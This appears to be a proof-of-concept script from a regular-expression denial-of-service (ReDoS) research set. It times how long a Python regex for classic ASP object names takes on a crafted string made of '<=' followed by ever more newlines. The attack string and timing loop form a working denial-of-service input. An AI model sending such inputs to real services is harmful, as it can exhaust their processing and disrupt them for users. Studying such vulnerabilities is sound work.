# 306
# (?<=(?:\n|:|&|\()\s*?)(Application\.Unlock|Application\.Lock|Application\.Contents\.RemoveAll|Application\.Contents\.Remove|Request\.BinaryRead|Request\.ClientCertificate|Request\.Cookies|Request\.Form|Request\.QueryString|Request\.ServerVariables|Request\.TotalBytes|Response\.AddHeader|Response\.AppendToLog|Response\.BinaryWrite|Response\.Clear|Response\.End|Response\.Flush|Response\.Redirect|Response\.Write|Response\.Buffer|Response\.CacheControl|Response\.Charset|Response\.CodePage|Response\.ContentType|Response\.Cookies|Response\.Expires|Response\.ExpiresAbsolute|Response\.IsClientConnected|Response\.LCID|Response\.PICS|Response\.Status|Server\.ScriptTimeout|Server\.CreateObject|Server\.Execute|Server\.GetLastError|Server\.HTMLEncode|Server\.MapPath|Server\.Transfer|Server\.URLEncode|Session\.Abandon|Session\.Contents\.Remove|Session\.Contents\.RemoveAll|Session\.CodePage|Session\.Contents|Session\.LCID|Session\.SessionID|Session\.StaticObjects|Session\.Timeout|Application|Session|Request)(?=\s|\.|\()
# POLYNOMIAL
# nums:4
# POLYNOMIAL AttackString:"<="+"\n"*10000+"!_1SLQ_2"

import re
from time import perf_counter

regex = """(?<=(?:\n|:|&|\()\s*?)(Application\.Unlock|Application\.Lock|Application\.Contents\.RemoveAll|Application\.Contents\.Remove|Request\.BinaryRead|Request\.ClientCertificate|Request\.Cookies|Request\.Form|Request\.QueryString|Request\.ServerVariables|Request\.TotalBytes|Response\.AddHeader|Response\.AppendToLog|Response\.BinaryWrite|Response\.Clear|Response\.End|Response\.Flush|Response\.Redirect|Response\.Write|Response\.Buffer|Response\.CacheControl|Response\.Charset|Response\.CodePage|Response\.ContentType|Response\.Cookies|Response\.Expires|Response\.ExpiresAbsolute|Response\.IsClientConnected|Response\.LCID|Response\.PICS|Response\.Status|Server\.ScriptTimeout|Server\.CreateObject|Server\.Execute|Server\.GetLastError|Server\.HTMLEncode|Server\.MapPath|Server\.Transfer|Server\.URLEncode|Session\.Abandon|Session\.Contents\.Remove|Session\.Contents\.RemoveAll|Session\.CodePage|Session\.Contents|Session\.LCID|Session\.SessionID|Session\.StaticObjects|Session\.Timeout|Application|Session|Request)(?=\s|\.|\()"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "<=" + "\n" * i * 10000 + "!_1SLQ_2"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *10000}: took {DURATION} seconds!")